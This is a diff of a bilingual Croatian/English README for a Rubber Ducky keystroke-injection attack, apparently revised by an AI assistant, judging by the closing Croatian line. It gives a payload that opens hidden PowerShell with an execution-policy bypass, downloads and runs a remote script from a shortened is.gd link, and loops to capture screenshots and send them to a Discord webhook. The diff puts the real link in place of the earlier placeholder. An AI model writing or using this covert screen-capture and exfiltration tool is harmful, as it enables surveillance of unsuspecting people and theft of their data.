@@ -1,28 +1,14 @@
-### README.md (na Hrvatskom)
+### README.md 
 
 # Screenshot na Discord Webhook
 
 Ova skripta omogućuje automatsko slanje screenshotova s vašeg računala na Discord kanal koristeći webhook. Skripta koristi PowerShell za snimanje zaslona, a Rubber Ducky uređaj za automatsko pokretanje procesa.
 
-## Preduvjeti
-
-1. **Rubber Ducky uređaj** (ili kompatibilni uređaj).
-2. **PowerShell** instaliran na računalu (Windows).
-3. **Discord webhook URL** za slanje screenshotova.
-
 ## Instalacija i Postavljanje
 
-### 1. Priprema PowerShell Skripte
+### 1. Rubber Ducky Skripta
 
-Prvo, trebate imati skriptu koja će automatski preuzeti sliku ekrana i poslati je na vaš Discord kanal. Ovu skriptu možete pohraniti na **GitHub** ili bilo koji drugi poslužitelj.
-
-1. Spremite PowerShell skriptu (`screenshot.ps1`) na GitHub ili neki drugi poslužitelj. Ako koristite GitHub, možete je pohraniti kao **gist**.
-
-2. Zamijenite `DISCORD_WEBHOOK_HERE` u Rubber Ducky skripti sa stvarnim Discord webhook URL-om.
-
-### 2. Rubber Ducky Skripta
-
-Ovdje je skripta koju treba prenijeti na vaš **Rubber Ducky uređaj**. Ova skripta će otvoriti PowerShell, preuzeti PowerShell skriptu s vašeg poslužitelja i izvršiti ju.
+Ovdje je skripta koju treba prenijeti na vaš **Rubber Ducky uređaj**. Ova skripta će otvoriti PowerShell, preuzeti PowerShell skriptu s poslužitelja i izvršiti ju.
 
 **Rubber Ducky Skripta:**
 
@@ -30,15 +16,15 @@ Ovdje je skripta koju treba prenijeti na vaš **Rubber Ducky uređaj**. Ova skri
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm linkzaps1fajlgithub | iex
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://is.gd/CF0P74 | iex
 ENTER
 ```
 
-Zamijenite `linkzaps1fajlgithub` s URL-om na kojem je pohranjena vaša PowerShell skripta.
+Zamijenite `WEBHOOK_HERE` s stvarnim Discord webhook URL-om.
 
-### 3. PowerShell Skripta (screenshot.ps1)
+### 2. PowerShell Skripta (preuzeta s internetskog linka)
 
-Ovdje je sadržaj PowerShell skripte koja će preuzeti screenshot i poslati ga na Discord webhook.
+Ovdje je sadržaj PowerShell skripte koja će preuzeti screenshot i poslati ga na Discord webhook:
 
 ```powershell
 $hookurl = $dc
@@ -62,7 +48,7 @@ while ($true) {
 }
 ```
 
-### 4. Pokretanje
+### 3. Pokretanje
 
 1. Spojite **Rubber Ducky uređaj** na računalo.
 2. Skripta će automatski otvoriti PowerShell, preuzeti i pokrenuti PowerShell skriptu koja snima screenshotove.
@@ -71,7 +57,7 @@ while ($true) {
 ## Upute za prilagodbu
 
 * **Interval između screenshotova**: Ako želite promijeniti interval između slanja screenshotova, uredite vrijednost `$seconds` u PowerShell skripti.
-* **Webhook URL**: Promijenite `DISCORD_WEBHOOK_HERE` u stvarni URL vašeg Discord webhook-a.
+* **Webhook URL**: Promijenite `WEBHOOK_HERE` u stvarni URL vašeg Discord webhook-a.
 
 ---
 
@@ -81,25 +67,11 @@ while ($true) {
 
 This script allows automatic screenshot capturing from your computer and sends them to a Discord channel using a webhook. It uses PowerShell to capture the screen and a Rubber Ducky device to automate the process.
 
-## Prerequisites
-
-1. **Rubber Ducky device** (or a compatible device).
-2. **PowerShell** installed on your computer (Windows).
-3. **Discord webhook URL** for sending screenshots.
-
 ## Installation and Setup
 
-### 1. Preparing the PowerShell Script
+### 1. Rubber Ducky Script
 
-First, you need to have a script that will automatically capture the screen and send it to your Discord channel. You can store this script on **GitHub** or any other server.
-
-1. Save the PowerShell script (`screenshot.ps1`) on GitHub or any other server. If you're using GitHub, you can store it as a **gist**.
-
-2. Replace `DISCORD_WEBHOOK_HERE` in the Rubber Ducky script with your actual Discord webhook URL.
-
-### 2. Rubber Ducky Script
-
-Here is the script you need to upload to your **Rubber Ducky device**. This script will open PowerShell, download the PowerShell script from your server, and execute it.
+Here is the script you need to upload to your **Rubber Ducky device**. This script will open PowerShell, download the PowerShell script from the server, and execute it.
 
 **Rubber Ducky Script:**
 
@@ -107,15 +79,15 @@ Here is the script you need to upload to your **Rubber Ducky device**. This scri
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H -C $dc='DISCORD_WEBHOOK_HERE'; irm linkzaps1fajlgithub | iex
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://is.gd/CF0P74 | iex
 ENTER
 ```
 
-Replace `linkzaps1fajlgithub` with the URL where your PowerShell script is stored.
+Replace `WEBHOOK_HERE` with your actual Discord webhook URL.
 
-### 3. PowerShell Script (screenshot.ps1)
+### 2. PowerShell Script (downloaded from internet link)
 
-Here is the content of the PowerShell script that will capture the screenshot and send it to the Discord webhook.
+Here is the content of the PowerShell script that will capture the screenshot and send it to the Discord webhook:
 
 ```powershell
 $hookurl = $dc
@@ -139,7 +111,7 @@ while ($true) {
 }
 ```
 
-### 4. Running
+### 3. Running
 
 1. Plug in the **Rubber Ducky device** to the computer.
 2. The script will automatically open PowerShell, download, and run the PowerShell script that captures the screenshots.
@@ -148,6 +120,8 @@ while ($true) {
 ## Customization Instructions
 
 * **Screenshot Interval**: If you want to change the interval between screenshots, modify the `$seconds` value in the PowerShell script.
-* **Webhook URL**: Change `DISCORD_WEBHOOK_HERE` to your actual Discord webhook URL.
+* **Webhook URL**: Change `WEBHOOK_HERE` to your actual Discord webhook URL.
 
 ---
+
+Nadam se da je ovo sada u skladu s tvojim željama!
